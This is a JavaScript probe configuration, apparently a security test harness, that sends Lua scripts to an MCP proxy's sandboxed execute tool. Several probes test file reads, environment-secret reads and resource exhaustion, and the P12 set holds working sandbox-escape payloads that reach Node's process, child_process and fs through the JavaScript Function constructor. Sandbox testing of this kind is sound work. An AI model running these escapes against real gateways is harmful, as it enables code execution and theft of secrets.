// Probe config for my-cool-proxy (Lua 5.4 via wasmoon), driven over its HTTP MCP endpoint with the `execute` tool.
import { execFileSync } from "node:child_process";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname } from "node:path";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StreamableHTTPClientTransport } from "@modelcontextprotocol/sdk/client/streamableHttp.js";

const here = dirname(fileURLToPath(import.meta.url));
export const countFile = `${here}/out/lookup-count.log`;
const pid = () => readFileSync(`${here}/out/proxy.pid`, "utf8").trim();

export async function connect() {
  const client = new Client({ name: "probe-driver", version: "1.0.0" });
  await client.connect(new StreamableHTTPClientTransport(new URL("http://127.0.0.1:41420/mcp")));
  // The gateway's documented workflow: list-servers, then tool-details before execute may call the tool.
  await client.callTool({ name: "list-servers", arguments: {} });
  const details = await client.callTool({ name: "tool-details", arguments: { luaServerName: "probe", luaToolName: "lookup" } });
  if (details.isError) throw new Error(`tool-details failed: ${JSON.stringify(details.content)}`);
  return { client, tool: "execute", argName: "script" };
}

export async function sideOutput(since) {
  const log = readFileSync(`${here}/out/proxy.log`, "utf8");
  return { proxyLogBytes: log.length };
}

export async function rss() {
  return Math.round(Number(execFileSync("ps", ["-o", "rss=", "-p", pid()]).toString().trim()) / 1024);
}

export async function kill() {
  execFileSync("kill", ["-9", pid()]);
}

export async function reset() {
  if (process.env.NO_RESET) return;
  execFileSync(`${here}/start-proxy.sh`, process.env.PROXY_CONFIG ? [process.env.PROXY_CONFIG] : [], { stdio: "ignore" });
}

export const probes = {
  P1: [`local r = probe.lookup({id = 21}):await()\nprint(r.value)\nresult(r.value)`],
  P2: [`print(string.rep("A", 200000))\nresult("RETURNED")`, `result(string.rep("A", 200000))`],
  P3: [`local http = require("socket.http")\nresult(http.request("https://example.com"))`, `result(io.popen("curl -s https://example.com"):read("a"))`],
  P4: [`result(io.open("/etc/hosts"):read("a"))`, `result(loadfile("/etc/hosts"))`, `result(dofile("/etc/hosts"))`],
  P5: [`result(os.getenv("PROBE_SECRET"))`],
  P6: [`while true do end`],
  P7: [`local a = {}\nwhile true do table.insert(a, string.rep("x", 1000000)) end`],
  P8: [`kept = 7\nresult("set")`, `result(kept == nil and "gone" or kept)`],
  P9: [`local ps = {}\nfor i = 1, 5 do ps[i] = probe.lookup({id = i}) end\nlocal vals = {}\nfor i = 1, 5 do vals[i] = ps[i]:await().value end\nresult(vals)`],
  P10: [`error("probe-boom")`, `local x = 1\nlocal y = 2\nerror("probe-boom")`],
  P11: `result(1 + 1)`,
  P12: [
    `local F = probe.lookup.constructor\nresult(tostring(F))`,
    `local F = probe.lookup.constructor\nlocal proc = F("return process")()\nresult(proc.env.PROBE_SECRET)`,
    `local F = result.constructor\nlocal proc = F("return process")()\nresult(proc.mainModule == nil and "no mainModule" or "has mainModule")`,
    `local F = probe.lookup.constructor\nlocal cp = F("return process.getBuiltinModule('child_process')")()\nresult(cp.execSync("echo PWNED"):toString())`,
    `local F = probe.lookup.constructor\nlocal fs = F("return process.getBuiltinModule('fs')")()\nresult(fs.readFileSync("/etc/hosts", "utf8"))`,
    `local p = probe.lookup({id = 1})\nresult(type(p) .. " " .. tostring(p.constructor))`,
    `local p = probe.lookup({id = 1})\nlocal proc = p.constructor.constructor("return process")()\nresult(proc.env.PROBE_SECRET)`,
    `local p = _gateway.summary_stats()\nlocal cp = p.constructor.constructor("return process.getBuiltinModule('child_process')")()\nresult(cp.execSync("echo PWNED"):toString())`,
    `local r = probe.lookup({id = 1}):await()\nresult(type(r) .. " " .. tostring(getmetatable(r)) .. " " .. tostring(r.constructor))`,
    `result(type(_gateway) .. " " .. type(_gateway.summary_stats) .. " " .. tostring(load))`,
  ],
};
